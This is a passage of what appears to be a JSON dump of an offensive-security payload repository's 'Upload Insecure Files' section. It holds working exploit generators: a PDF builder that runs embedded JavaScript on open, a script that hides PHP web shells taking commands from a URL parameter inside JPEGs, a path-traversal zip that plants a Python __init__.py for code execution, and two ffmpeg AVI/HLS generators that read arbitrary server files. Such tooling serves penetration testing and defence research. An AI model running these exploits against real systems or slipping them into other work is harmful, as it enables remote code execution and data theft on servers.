page.Resources.Font.F1.BaseFont = PdfName.Helvetica\n\n    page.MediaBox = PdfArray([0, 0, 612, 792])\n\n    page.Contents = PdfDict()\n    page.Contents.stream = \"\"\"\nBT\n/F1 24 Tf\nET\n    \"\"\"\n\n    annots = fields\n\n    page.AA = PdfDict()\n    # You probably should just wrap each JS action with a try/catch,\n    # because Chrome does no error reporting or even logging otherwise;\n    # you just get a silent failure.\n    page.AA.O = make_js_action(\"\"\"\ntry {\n  %s\n} catch (e) {\n  app.alert(e.message);\n}\n    \"\"\" % (script))\n\n    page.Annots = PdfArray(annots)\n    return page\n\nif len(sys.argv) > 1:\n    js_file = open(sys.argv[1], 'r')\n\n    fields = []\n    for line in js_file:\n        if not line.startswith('/// '): break\n        pieces = line.split()\n        params = [pieces[1]] + [float(token) for token in pieces[2:]]\n        fields.append(make_field(*params))\n\n    js_file.seek(0)\n\n    out = PdfWriter()\n    out.addpage(make_page(fields, js_file.read()))\n    out.write('result.pdf')", "Upload Insecure Files/Picture Compression/createBulletproofJPG.py": "#!/usr/bin/python\n\n\"\"\"\n    Bulletproof Jpegs Generator\n    Copyright (C) 2012  Damien \"virtualabs\" Cauquil\n\n    This program is free software; you can redistribute it and/or modify\n    it under the terms of the GNU General Public License as published by\n    the Free Software Foundation; either version 2 of the License, or\n    (at your option) any later version.\n\n    This program is distributed in the hope that it will be useful,\n    but WITHOUT ANY WARRANTY; without even the implied warranty of\n    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n    GNU General Public License for more details.\n\n    You should have received a copy of the GNU General Public License along\n    with this program; if not, write to the Free Software Foundation, Inc.,\n    51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.\n\n\t-------------\n\t# How to use\n\tb.php?c=ls\n\tSource: http://www.virtualabs.fr/Nasty-bulletproof-Jpegs-l\n\"\"\"\nfrom __future__ import print_function\n\nfrom future import standard_library\nstandard_library.install_aliases()\nfrom builtins import range\nimport struct,sys,os\nimport gd\nfrom io import StringIO\nfrom random import randint,shuffle\nfrom time import time\n\n# image width/height (square)\nN = 32\n\n\ndef insertPayload(_in, _out, payload,off):\n\t\"\"\"\n\tPayload insertion (quick JPEG parsing and patching)\n\t\"\"\"\n\timg = _in\n\t# look for 'FF DA' (SOS)\n\tsos = img.index(\"\\xFF\\xDA\")\n\tsos_size = struct.unpack('>H',img[sos+2:sos+4])[0]\n\tsod = sos_size+2\n\t# look for 'FF D9' (EOI)\n\teoi = img[sod:].index(\"\\xFF\\xD9\")\n\t# enough size ?\n\tif (eoi - sod - off)>=len(payload):\n\t\t_out.write(img[:sod+sos+off]+payload+img[sod+sos+len(payload)+off:])\n\t\treturn True\n\telse:\n\t\treturn False\n\nif __name__=='__main__':\n\n\tprint(\"[+] Virtualabs' Nasty bulletproof Jpeg generator\")\n\tprint(\" |  website: http://virtualabs.fr\")\n\tprint(\" |  contact: virtualabs -at- gmail -dot- com\")\n\tprint(\"\")\n\n\tpayloads = [\"<?php system(/**/$_GET['c'/**/]); ?>\",\"<?php /**/system($_GET[chr(99)/**/]); ?>\",\"<?php system(/**/$_GET[chr(99)]); ?>\",\"<?php\\r\\nsystem($_GET[/**/'c']);\\r\\n ?>\"]\n\n\t# make sure the exploit-jpg directory exists or create it\n\tif os.path.exists('exploit-jpg') and not os.path.isdir('exploit-jpg'):\n\t\tprint(\"[!] Please remove the file named 'exploit-jpg' from the current directory\")\n\telif not os.path.exists('exploit-jpg'):\n\t\tos.mkdir('exploit-jpg')\n\t\t\n\t# start generation\n\tprint('[i] Generating ...')\n\tfor q in list(range(50,100))+[-1]:\n\t\t# loop over every payload\t\t\n\t\tfor p in payloads:\n\t\t\t# not done yet\n\t\t\tdone = False\n\t\t\tstart = time()\n\t\t\t# loop while not done and timeout not reached\n\t\t\twhile not done and (time()-start)<10.0:\n\t\t\t\t\n\t\t\t\t# we create a NxN pixels image, true colors\n\t\t\t\timg = gd.image((N,N),True)\n\t\t\t\t# we create a palette\n\t\t\t\tpal = []\n\t\t\t\tfor i in range(N*N):\n\t\t\t\t\tpal.append(img.colorAllocate((randint(0,256),randint(0,256),randint(0,256))))\n\t\t\t\t# we shuffle this palette\n\t\t\t\tshuffle(pal)\n\t\t\t\t# and fill the image with it\t\t\t\n\t\t\t\tpidx = 0\n\t\t\t\tfor x in  range(N):\n\t\t\t\t\tfor y in range(N):\n\t\t\t\t\t\timg.setPixel((x,y),pal[pidx])\n\t\t\t\t\t\tpidx+=1\n\t\t\t\t\t\t\n\t\t\t\t# write down the image\n\t\t\t\tout_jpg = StringIO('')\t\n\t\t\t\timg.writeJpeg(out_jpg,q)\n\t\t\t\tout_raw = out_jpg.getvalue()\n\t\t\t\t\t\t\t\n\t\t\t\t# now, we try to insert the payload various ways\n\t\t\t\tfor i in range(64):\n\t\t\t\t\ttest_jpg = StringIO('')\n\t\t\t\t\tif insertPayload(out_raw,test_jpg,p,i):\n\t\t\t\t\t\ttry:\n\t\t\t\t\t\t\t# write down the new jpeg file\n\t\t\t\t\t\t\tf = open('exploit-jpg/exploit-%d.jpg'%q,'wb')\n\t\t\t\t\t\t\tf.write(test_jpg.getvalue())\n\t\t\t\t\t\t\tf.close()\n\t\t\t\t\t\t\t\n\t\t\t\t\t\t\t# load it with GD\n\t\t\t\t\t\t\ttest = gd.image('exploit-jpg/exploit-%d.jpg'%q)\n\t\t\t\t\t\t\tfinal_jpg = StringIO('')\n\t\t\t\t\t\t\ttest.writeJpeg(final_jpg,q)\n\t\t\t\t\t\t\tfinal_raw = final_jpg.getvalue()\n\t\t\t\t\t\t\t# does it contain our payload ?\n\t\t\t\t\t\t\tif p in final_raw:\n\t\t\t\t\t\t\t\t# Yay ! \n\t\t\t\t\t\t\t\tprint('[i] Jpeg quality %d ... DONE'%q)\n\t\t\t\t\t\t\t\tdone = True\n\t\t\t\t\t\t\t\tbreak\n\t\t\t\t\t\texcept IOError as e:\n\t\t\t\t\t\t\tpass\n\t\t\t\t\telse:\n\t\t\t\t\t\tbreak\n\t\t\tif not done:\n\t\t\t\t# payload not found, we remove the file\n\t\t\t\tos.unlink('exploit-jpg/exploit-%d.jpg'%q)\n\t\t\telse:\t\t\n\t\t\t\tbreak\n\t\t\t", "Upload Insecure Files/Configuration Python __init__.py/python-generate-init.py": "# Generating \"evil\" zip file\n# Based on the work of Ajin Abraham\n# Vuln website : https://github.com/ajinabraham/bad_python_extract\n# More info : https://ajinabraham.com/blog/exploiting-insecure-file-extraction-in-python-for-code-execution\n\n# Warning 1: need a restart from the server OR debug=True\n# Warning 2: you won't get the output of the command (blind rce)\nimport zipfile\n\ndirectories = [\"conf\", \"config\", \"settings\", \"utils\", \"urls\", \"view\", \"tests\", \"scripts\", \"controllers\", \"modules\", \"models\", \"admin\", \"login\"]\nfor d in directories:\n    name = \"python-\"+d+\"-__init__.py.zip\"\n    zipf = zipfile.ZipFile(name, 'w', zipfile.ZIP_DEFLATED)\n    zipf.close()\n    z_info = zipfile.ZipInfo(r\"../\"+d+\"/__init__.py\")\n    z_file = zipfile.ZipFile(name, mode=\"w\") # \"/home/swissky/Bureau/\"+\n    z_file.writestr(z_info, \"import os;print 'Shell';os.system('ls');\")\n    z_info.external_attr = 0o777 << 16\n    z_file.close()\n", "Upload Insecure Files/CVE Ffmpeg HLS/gen_xbin_avi.py": "#!/usr/bin/env python3\nfrom builtins import bytes\nfrom builtins import map\nfrom builtins import zip\nfrom builtins import range\nimport struct\nimport argparse\nimport random\nimport string\n\nAVI_HEADER = b\"RIFF\\x00\\x00\\x00\\x00AVI LIST\\x14\\x01\\x00\\x00hdrlavih8\\x00\\x00\\x00@\\x9c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LISTt\\x00\\x00\\x00strlstrh8\\x00\\x00\\x00txts\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x00\\x00\\x00\\x86\\x03\\x00\\x00\\x10'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\xa0\\x00strf(\\x00\\x00\\x00(\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x01\\x00\\x18\\x00XVID\\x00H\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LIST    movi\"\n\nECHO_TEMPLATE = \"\"\"### echoing {needed!r}\n#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x{iv}\n#EXTINF:1,\n#EXT-X-BYTERANGE: 16\n/dev/zero\n#EXT-X-KEY: METHOD=NONE\n\"\"\"\n\n# AES.new('\\x00'*16).decrypt('\\x00'*16)\nGAMMA = b'\\x14\\x0f\\x0f\\x10\\x11\\xb5\"=yXw\\x17\\xff\\xd9\\xec:'\n\nFULL_PLAYLIST = \"\"\"#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n{content}\n#### random string to prevent caching: {rand}\n#EXT-X-ENDLIST\"\"\"\n\nEXTERNAL_REFERENCE_PLAYLIST = \"\"\"\n\n####  External reference: reading {size} bytes from {filename} (offset {offset})\n#EXTINF:1,\n#EXT-X-BYTERANGE: {size}@{offset}\n{filename}\n\n\n\"\"\"\n\nXBIN_HEADER = b'XBIN\\x1A\\x20\\x00\\x0f\\x00\\x10\\x04\\x01\\x00\\x00\\x00\\x00'\n\n\ndef echo_block(block):\n    assert len(block) == 16\n    iv = ''.join(map('{:02x}'.format, [x ^ y for (x, y) in zip(block, GAMMA)]))\n    return ECHO_TEMPLATE.format(needed=block, iv=iv)\n\n\ndef gen_xbin_sync():\n    seq = []\n    for i in range(60):\n        if i % 2:\n            seq.append(0)\n        else:\n            seq.append(128 + 64 - i - 1)\n    for i in range(4, 0, -1):\n        seq.append(128 + i - 1)\n    seq.append(0)\n    seq.append(0)\n    for i in range(12, 0, -1):\n        seq.append(128 + i - 1)\n    seq.append(0)\n    seq.append(0)\n    return seq\n\n\ndef test_xbin_sync(seq):\n    for start_ind in range(64):\n        path = [start_ind]\n        cur_ind = start_ind\n        while cur_ind < len(seq):\n            if seq[cur_ind] == 0:\n                cur_ind += 3\n            else:\n                assert seq[cur_ind] & (64 + 128) == 128\n                cur_ind += (seq[cur_ind] & 63) + 3\n            path.append(cur_ind)\n        assert cur_ind == len(seq), \"problem for path {}\".format(path)\n\n\ndef echo_seq(s):\n    assert len(s) % 16 == 0\n    res = []\n    for i in range(0, len(s), 16):\n        res.append(echo_block(s[i:i + 16]))\n    return ''.join(res)\n\n\ntest_xbin_sync(gen_xbin_sync())\n\nSYNC = echo_seq(gen_xbin_sync())\n\n\ndef make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3):\n    content = b'GAB2\\x00\\x02\\x00' + b'\\x00' * 10 + playlist.encode('ascii')\n    packet = b'00tx' + struct.pack('<I', len(content)) + content\n    dcpkt = b'00dc' + struct.pack('<I',\n                                  fake_packet_len) + b'\\x00' * fake_packet_len\n    return AVI_HEADER + packet + dcpkt * fake_packets\n\n\ndef gen_xbin_packet_header(size):\n    return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])\n\n\ndef gen_xbin_packet_playlist(filename, offset, packet_size):\n    result = []\n    while packet_size > 0:\n        packet_size -= 16\n        assert packet_size > 0\n        part_size = min(packet_size, 64)\n        packet_size -= part_size\n        result.append(echo_block(gen_xbin_packet_header(part_size)))\n        result.append(\n            EXTERNAL_REFERENCE_PLAYLIST.format(\n                size=part_size,\n                offset=offset,\n                filename=filename))\n        offset += part_size\n    return ''.join(result), offset\n\n\ndef gen_xbin_playlist(filename_to_read):\n    pls = [echo_block(XBIN_HEADER)]\n    next_delta = 5\n    for max_offs, filename in (\n            (5000, filename_to_read), (500, \"file:///dev/zero\")):\n        offset = 0\n        while offset < max_offs:\n            for _ in range(10):\n                pls_part, new_offset = gen_xbin_packet_playlist(\n                    filename, offset, 0xf0 - next_delta)\n                pls.append(pls_part)\n                next_delta = 0\n            offset = new_offset\n        pls.append(SYNC)\n    return FULL_PLAYLIST.format(content=''.join(pls), rand=''.join(\n        random.choice(string.ascii_lowercase) for i in range(30)))\n\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser('AVI+M3U+XBIN ffmpeg exploit generator')\n    parser.add_argument(\n        'filename',\n        help='filename to be read from the server (prefix it with \"file://\")')\n    parser.add_argument('output_avi', help='where to save the avi')\n    args = parser.parse_args()\n    assert '://' in args.filename, \"ffmpeg needs explicit proto (forgot file://?)\"\n    content = gen_xbin_playlist(args.filename)\n    avi = make_playlist_avi(content)\n    output_name = args.output_avi\n\n    with open(output_name, 'wb') as f:\n        f.write(avi)\n", "Upload Insecure Files/CVE Ffmpeg HLS/gen_avi_bypass.py": "import struct\nimport argparse\n\nAVI_HEADER = b\"RIFF\\x00\\x00\\x00\\x00AVI LIST\\x14\\x01\\x00\\x00hdrlavih8\\x00\\x00\\x00@\\x9c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00}\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LISTt\\x00\\x00\\x00strlstrh8\\x00\\x00\\x00txts\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x19\\x00\\x00\\x00\\x00\\x00\\x00\\x00}\\x00\\x00\\x00\\x86\\x03\\x00\\x00\\x10'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\xa0\\x00strf(\\x00\\x00\\x00(\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\xa0\\x00\\x00\\x00\\x01\\x00\\x18\\x00XVID\\x00H\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00LIST    movi\"\n\n\ndef make_txt_packet(content, fake_packets=50, fake_packet_len=200):\n    content = b'GAB2\\x00\\x02\\x00' + b'\\x00' * 10 + content\n    packet = b'00tx' + struct.pack('<I', len(content)) + content\n    dcpkt = b'00dc' + struct.pack('<I', fake_packet_len) + b'\\x00' * fake_packet_len\n    return packet + dcpkt * fake_packets\n\nTXT_PLAYLIST = \"\"\"#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:1.0,\n#EXT-X-BYTERANGE: 0\n{txt}\n#EXTINF:1.0,\n{file}\n#EXT-X-ENDLIST\"\"\"\n\ndef prepare_txt_packet(txt, filename):\n    return make_txt_packet(TXT_PLAYLIST.format(txt=txt, file=filename).encode())\n\n# TXT_LIST = ['/usr/share/doc/gnupg/Upgrading_From_PGP.txt', '/usr/share/doc/mount/mount.txt', '/etc/pki/nssdb/pkcs11.txt', '/usr/share/gnupg/help.txt']\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser('HLS AVI TXT exploit generator')\n    parser.add_argument('filename', help='file that should be read from convertion instance')\n    parser.add_argument('output_avi', help='where to save the avi')\n    parser.add_argument('--txt', help='any .txt file that exist on target system', default='GOD.txt')\n    args = parser.parse_args()\n    avi = AVI_HEADER + prepare_txt_packet(args.txt, args.filename)\n    output_name = args.output_avi\n\n    with open(output_name, 'wb') as f:\n        f.write(avi)\n\n"}